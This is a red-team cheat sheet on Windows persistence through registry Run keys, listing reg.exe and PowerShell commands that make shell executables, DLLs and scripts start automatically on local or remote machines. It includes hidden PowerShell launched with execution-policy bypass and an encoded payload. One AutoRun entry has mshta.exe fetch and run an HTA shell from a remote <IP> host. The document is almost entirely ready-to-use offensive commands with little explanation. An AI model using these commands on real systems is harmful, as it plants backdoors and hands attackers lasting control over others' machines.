# Living off the Land

## 01 - Registry Backdoors

### 1.1 - HKLM

#### 1.1.1 - Add Registry Key Syntax

Command Prompt

```
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
@=""
"<value_1>"="C:\\Windows\\System32\\cmd.exe /c powershell.exe -e <base64_encoded>"
"<value_n>"=""
```

```
C\> reg.exe import file.reg
```

```
C:\> reg.exe add [\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v <value> /t reg_sz /d "rundll32.exe C:\path\to\shell.dll,ExecDLL" /f
```

PowerShell

```powershell
PS C:\> Set-ItemProperty -Force -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "<value>" -Type String -Value "C:\path\to\shell.exe"
```

#### 1.1.2 - Delete Registry Key Syntax

```
C:\> reg.exe del [\\<IP>\]HKLM\SOFTWARE\Microsoft\CurrentVersion\Run /v <value> /f
```

### HKLM

```
C:\> reg.exe add [\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Autorun /t REG_SZ /d "C:\path\to\shell.exe"

C:\> reg.exe add [\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce /v UpdateOnce /t REG_SZ /d "C:\path\to\shell.exe"

C:\> reg.exe add [\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices /v WindowsService /t REG_SZ /d "C:\path\to\shell.exe"

C:\> reg.exe add [\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce /v UpdateSVC /t REG_SZ /d "C:\path\to\shell.exe"

C:\> reg.exe add [\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001 /v Autorun /t REG_SZ /d "C:\path\to\shell.exe"

C:\> reg.exe add [\\<IP>\]HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v Dependency /t REG_SZ /d "C:\path\to\shell.dll"
```

### HKCU

```
C:\> reg.exe add [\\<IP>\]HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Image /t REG_SZ /d "C:\path\to\shell.exe" /f

C:\> reg.exe add [\\<IP>\]HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Image /t REG_SZ /d "powershell.exe -ep bypass -w hidden -nologo -NonI -f C:\path\to\shell.ps1" /f

C:\> reg.exe add [\\<IP>\]HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /v WindowsUpdate /t REG_SZ /d "rundll32.exe C:\path\to\shell.dll,ExecuteShell" /f

C:\> reg.exe add [\\<IP>\]HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices /v Image /t REG_SZ /d "C:\path\to\shell.exe" /f

C:\> reg.exe add [\\<IP>\]HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce /v Image /t REG_SZ /d "C:\path\to\shell.exe" /f

C:\> reg.exe add "[\\<IP>\]HKCU\SOFTWARE\Microsoft\Command Processor" /v AutoRun /t REG_SZ /d "powershell.exe Start-Process -windowstyle hidden -FilePath mshta.exe http://<IP>/shell.hta" /f
```

---
## References

### Backlinks

- [[Windows Post Exploitation Persistence References]]

### LOFLCAB

- [LOFLCAB: reg](https://lofl-project.github.io/loflcab/Binaries/reg/)

### Persistence Info

- [Persistence Info: "Run" and "RunOnce" registry keys](https://persistence-info.github.io/Data/run.html)

### DMCXBlue

- [DMCXBlue: Registry Keys / StartUp Folder](https://dmcxblue.gitbook.io/red-team-notes/persistence/registry-keys-startup-folder)

- [DMCXBlue: Userland Persistence](https://dmcxblue.gitbook.io/red-team-notes-2-0/persistence/userland-persistence)